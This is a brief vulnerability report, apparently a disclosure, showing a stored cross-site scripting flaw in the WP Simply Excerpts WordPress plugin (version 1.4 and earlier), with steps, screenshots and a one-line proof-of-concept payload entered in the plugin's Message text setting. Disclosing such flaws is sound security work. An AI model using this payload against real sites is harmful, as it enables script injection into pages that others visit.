Cross-Site Scripting (XSS) vulnerability in WP Simply Excerpts Plugin <= 1.4 at WordPress.

[![pPryDgK.png](https://s1.ax1x.com/2023/09/05/pPryDgK.png)](https://imgse.com/i/pPryDgK)
 - [ ] STEPS:
	1.After installing the plugin, click Simply Excerpts Settings.
[![pPryyuD.png](https://s1.ax1x.com/2023/09/05/pPryyuD.png)](https://imgse.com/i/pPryyuD)
 - [ ] 
 	2.Put poc in Message text then click Update
	POC：

	```
	1"><img src=1 onerror=alert(/xss/)>
	```
[![pPryrjO.png](https://s1.ax1x.com/2023/09/05/pPryrjO.png)](https://imgse.com/i/pPryrjO)
Then XSS vulnerability triggered
[![pPry6De.png](https://s1.ax1x.com/2023/09/05/pPry6De.png)](https://imgse.com/i/pPry6De)
[![pPry2Ed.png](https://s1.ax1x.com/2023/09/05/pPry2Ed.png)](https://imgse.com/i/pPry2Ed)